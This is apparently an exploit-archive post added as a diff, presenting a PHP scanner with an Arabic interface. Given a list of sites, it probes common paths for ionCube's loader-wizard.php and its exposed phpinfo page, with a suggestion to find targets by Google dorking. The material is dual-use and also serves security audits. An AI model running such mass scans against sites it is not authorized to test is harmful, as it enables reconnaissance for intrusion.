@@ -1,0 +1,136 @@
+=============================================================================================================================================
+| # Title     : ionCube Loader Wizard v 14.4.0 Scanner                                                                                      |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 137.0.1 (64 bits)                                                            |
+| # Vendor    : https://www.ioncube.com/loaders.php                                                                                         |
+=============================================================================================================================================
+
+POC :
+
+[+] Dorking İn Google Or Other Search Enggine.
+
+[+] Code Description: This tool tested on 2.35, for ionCube Loader Wizard, scans the target for the installation file and displays PHP info to gather more information about the target.
+
+    Check the set of sites you are accessing through the interface.
+
+    About the file: loader-wizard.php
+
+    Inside large stores (such as /ioncube/, /tools/, etc.).
+
+    Check if the phpinfo() page is embedded
+	
+	Displays results directly in your browser.
+	
+    Detects sites with vulnerabilities related to the ionCube Loader Wizard.
+
+    Targets exposed phpinfo (useful for gathering information).
+
+    Security analysis and security audits for a group of sites.
+
+    Results are stored in a results.txt text file.
+	
+[+] save code as poc.php.
+
+[+] Set TArget : 127.0.0.1/poc.php
+
+[+] PayLoad :
+
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <title>فاحص مواقع loader-wizard.php و phpinfo المكشوف</title>
+    <style>
+        body { font-family: Tahoma, sans-serif; background-color: #f9f9f9; padding: 20px; }
+        textarea { width: 100%; height: 200px; font-size: 14px; }
+        input[type=submit] { padding: 10px 20px; margin-top: 10px; font-weight: bold; }
+        .result { background: #fff; border: 1px solid #ccc; padding: 15px; margin-top: 20px; white-space: pre-wrap; direction: ltr; text-align: left; }
+        h2 { color: #222; }
+    </style>
+</head>
+<body>
+    <h2>🛡️ فاحص loader-wizard.php + صفحة phpinfo المكشوفة</h2>
+    <form method="post">
+        <label>🔗 أدخل قائمة المواقع (كل موقع في سطر):</label><br>
+        <textarea name="sites" placeholder="example.com&#10;test.com"></textarea><br>
+        <input type="submit" name="scan" value="ابدأ الفحص">
+    </form>
+
+<?php
+if (isset($_POST['scan'])) {
+    $sites_input = trim($_POST['sites']);
+    if (!empty($sites_input)) {
+        $sites = explode("\n", $sites_input);
+        $paths = [
+            "/loader-wizard.php",
+            "/ioncube/loader-wizard.php",
+            "/tools/loader-wizard.php",
+            "/test/loader-wizard.php",
+            "/public/loader-wizard.php",
+        ];
+
+        $report = "📋 تقرير فحص loader-wizard.php و phpinfo - " . date("Y-m-d H:i:s") . "\n\n";
+
+        echo '<div class="result"><strong>📋 نتائج الفحص:</strong><br><br>';
+
+        foreach ($sites as $site) {
+            $site = trim($site);
+            if (!$site) continue;
+            if (!preg_match("#^https?://#", $site)) $site = "http://$site";
+
+            $report .= "🌐 الموقع: $site\n";
+            echo "🌐 الموقع: $site\n";
+
+            $found = false;
+
+            foreach ($paths as $path) {
+                $url = rtrim($site, '/') . $path;
+                $headers = @get_headers($url);
+                if ($headers && strpos($headers[0], '200') !== false) {
+                    $content = @file_get_contents($url);
+                    if ($content && strpos($content, 'ionCube') !== false) {
+                        $msg = "⚠️ تم العثور على loader-wizard.php في: $url\n";
+                        echo $msg;
+                        $report .= $msg;
+                        $found = true;
+                        break;
+                    }
+                }
+            }
+
+            $phpinfo_url = rtrim($site, '/') . "/ioncube/loader-wizard.php?page=phpinfo";
+            $headers = @get_headers($phpinfo_url);
+            if ($headers && strpos($headers[0], '200') !== false) {
+                $content = @file_get_contents($phpinfo_url);
+                if ($content && strpos($content, 'PHP Version') !== false && strpos($content, 'Configuration') !== false) {
+                    $msg = "🔍 ⚠️ صفحة phpinfo مكشوفة في: $phpinfo_url\n";
+                    echo $msg;
+                    $report .= $msg;
+                    $found = true;
+                }
+            }
+
+            if (!$found) {
+                $msg = "✅ لا يوجد ملف loader-wizard.php أو صفحة phpinfo مكشوفة.\n";
+                echo $msg;
+                $report .= $msg;
+            }
+
+            $report .= str_repeat("-", 50) . "\n";
+            echo str_repeat("-", 50) . "\n";
+        }
+
+        // حفظ النتائج في ملف TXT
+        file_put_contents("results.txt", $report);
+
+        echo "<br>📁 تم حفظ النتائج في ملف <strong>results.txt</strong>";
+        echo '</div>';
+    }
+}
+?>
+</body>
+</html>
+
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
